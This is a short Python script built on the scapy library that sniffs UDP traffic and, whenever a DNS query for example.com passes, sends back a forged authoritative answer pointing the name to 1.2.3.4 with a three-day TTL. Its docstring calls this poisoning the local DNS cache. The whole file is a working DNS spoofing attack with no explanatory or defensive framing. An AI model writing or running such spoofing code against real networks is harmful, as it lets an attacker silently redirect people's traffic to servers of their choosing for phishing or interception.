from scapy.all import *

# flush DNS cache: ipconfig /flushdns

def poison_cache(pkt):
    """Spoof DNS request to `example.com` and poison local DNS cache"""
    if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        print("Spoofing DNS reply for DNS query for `example.com`")
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp = UDP(sport=53, dport=pkt[UDP].sport)

        Annsec = DNSRR(
            rrname=pkt[DNS].qd.qname, type='A',
            rdata='1.2.3.4', ttl=259200
        )
        dns = DNS(
            id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1,
             qr=1, qdcount=1, ancount=1, an=Annsec
        )

        spoofpkt = ip/udp/dns
        send(spoofpkt, verbose=0)

if __name__ == "__main__":
    sniff(filter="udp", prn=poison_cache)